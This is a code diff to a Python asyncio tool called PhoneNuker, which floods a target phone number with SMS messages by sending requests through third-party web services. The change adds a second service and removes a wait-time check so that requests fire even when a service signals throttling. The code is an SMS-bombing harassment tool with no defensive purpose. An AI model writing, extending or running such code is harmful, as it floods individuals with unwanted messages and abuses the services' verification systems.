@@ -1,13 +1,15 @@
 import asyncio
 import aiohttp
 
-from site_request.site_1881 import request as request_1881
+from site_request.site_1881 import Request as request_1881
+from site_request.site_power import Request as request_power  
 
 class PhoneNuker:
     def __init__(self):
-        self.phone_number = "TARGET_PHONE_NUMBER"  
+        self.phone_number = "YOUR_PHONE_NUMBER_HERE" 
         self.request_services = [
             request_1881,
+            request_power
         ]
 
     async def spam_sms_single(self, session, service_index):
@@ -15,7 +17,7 @@ class PhoneNuker:
         try:
             request_instance = request_class(self.phone_number, session)
             valid, response, wait_time = await request_instance.send_sms()
-            if valid and wait_time is False:
+            if valid:
                 print(f"Service {service_index}: {response}")
             else:
                 print(f"Service {service_index} failed: {response}")
